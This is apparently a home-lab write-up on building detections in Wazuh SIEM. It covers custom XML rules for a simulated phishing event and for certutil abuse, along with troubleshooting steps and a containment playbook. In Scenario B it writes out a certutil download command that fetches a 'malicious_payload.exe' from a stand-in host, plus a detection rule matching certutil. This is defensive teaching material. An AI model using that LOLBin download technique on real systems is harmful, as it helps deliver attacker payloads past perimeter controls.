
# SOC Detection Engineering Lab: Phishing Simulation & LOLBin Telemetry Analysis with Wazuh SIEM

---

## 1. Project Overview & Objectives

This project demonstrates the end-to-end implementation of a virtualized Security Operations Center (SOC) detection lab. The objective was to configure endpoint log ingestion, engineer custom SIEM detection rules, simulate adversary tactics (Initial Access and Ingress Tool Transfer), and analyze resulting telemetry inside Wazuh SIEM.

The lab validates how custom XML rules and proper event channel telemetry transform raw Windows event logs into actionable, MITRE ATT&CK-mapped security alerts for triage.

---

## 2. Lab Architecture & Network Topology

| Component | Hostname | IP Address | OS / Platform | Role |
| --- | --- | --- | --- | --- |
| **SIEM Server** | `wazuh-server` | `192.168.0.216` | Ubuntu Linux | Manager, Indexer, & Dashboard |
| **Monitored Host** | `windows11-target` | `192.168.0.134` | Windows 11 Enterprise | Monitored Endpoint (`Agent ID: 001`) |

```text
[ Windows 11 Target (192.168.0.134) ]
   │
   ├─► Event Generation (eventcreate, certutil LOLBin execution)
   ├─► Windows Event Channels (Application, Security, System)
   │
   ▼ (Wazuh Agent Service / TCP 1514)
[ Wazuh Manager (192.168.0.216) ]
   │
   ├─► Analysis Engine (wazuh-analysisd)
   ├─► Decoders & Custom Rules (local_rules.xml)
   │
   ▼
[ Wazuh Indexer & Dashboard ] ──► SOC Alert Triage & Root Cause Analysis

```

---

## 3. Detection Engineering & Custom Rules

Wazuh's default Windows decoders drop or assign low severity levels ($< 3$) to generic application logs. Custom rules were authored in `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager to detect simulated phishing activity and Living-off-the-Land Binary (LOLBin) abuse.

```xml
<group name="local,syslog,sshd">

  <!-- Rule 1: Custom Phishing Simulation Alert -->
  <rule id="100002" level="10">
    <if_group>windows</if_group>
    <match>WazuhPhishingLab</match>
    <description>Simulated Phishing Alert: Suspicious Activity Detected on $(win.system.computer)</description>
    <mitre>
      <id>T1566</id>
    </mitre>
  </rule>

  <!-- Rule 2: Suspicious Ingress Tool Transfer via Certutil -->
  <rule id="100005" level="12">
    <if_group>windows</if_group>
    <match>certutil</match>
    <description>Suspicious Ingress Tool Transfer via Certutil (Possible Phishing Download)</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>

</group>

```

---

## 4. Attack Emulation & SOC Incident Triage

### Scenario A: Phishing Simulation (MITRE T1566)

To emulate an initial access event (such as a malicious link execution from a simulated phishing email), a custom warning event was injected into the Windows `Application` channel:

```powershell
eventcreate /L APPLICATION /T WARNING /ID 999 /SO WazuhPhishingLab /D "SIMULATED PHISHING TEST - suspicious link detected in training environment"

```

* **Alert Verification:** The manager successfully ingested the event and triggered **Rule 100002** at Level 10 (High).
* **Telemetry Extraction:**
* `agent.id`: `001` (`windows11-target`)
* `data.win.system.providerName`: `WazuhPhishingLab`
* `data.win.system.eventID`: `999`
* `rule.mitre.technique`: `Phishing` (`T1566`)



---

### Scenario B: Living-off-the-Land Binary / Ingress Transfer (MITRE T1105)

Adversaries frequently abuse native Windows utilities like `certutil.exe` to download secondary payloads while bypassing standard perimeter controls.

Execution test command:

```powershell
cd $env:TEMP
certutil.exe -urlcache -split -f "https://example.com/malicious_payload.exe" fake_payload.exe

```

* **EDR & Antivirus Interaction:** Real-time protection on the target host actively intercepted unauthorized binary downloads, validating endpoint protection behavior alongside SIEM log generation.

---

## 5. Engineering Challenges & Troubleshooting

During deployment, several operational issues were diagnosed and resolved using a structured SOC troubleshooting methodology:

* **Channel Ingestion Gaps:** The test event initially failed to appear in the dashboard. Inspection of the Windows agent's `ossec.conf` confirmed that while the agent was running, the `Application` channel required explicit validation under `<localfile>` configuration blocks:
```xml
<localfile>
  <location>Application</location>
  <log_format>eventchannel</log_format>
</localfile>

```


* **Alert Level Threshold Filtering:** By default, generic application events are ingested at level 0 or 2, which bypasses the indexing threshold. Custom rule `100002` elevated the severity to Level 10 to ensure persistent indexing.
* **Schema Validation:** Used the `wazuh-analysisd -t` validation binary on the manager to debug and correct XML syntax typos before restarting the daemon.

---

## 6. Incident Response & Containment Playbook

For production environments alerting on similar indicators:

1. **Host Isolation:** Immediately isolate `windows11-target` (`192.168.0.134`) via network quarantine to restrict lateral propagation.
2. **Process Investigation:** Review process execution trees for parent processes spawning `powershell.exe`, `cmd.exe`, or `certutil.exe`.
3. **Artifact Eradication:** Inspect and purge downloaded artifacts located within `%TEMP%` and `%APPDATA%`.
4. **Policy Hardening:** Enforce AppLocker or Windows Defender Application Control (WDAC) rules to restrict non-administrative execution of LOLBins with outbound network flags.
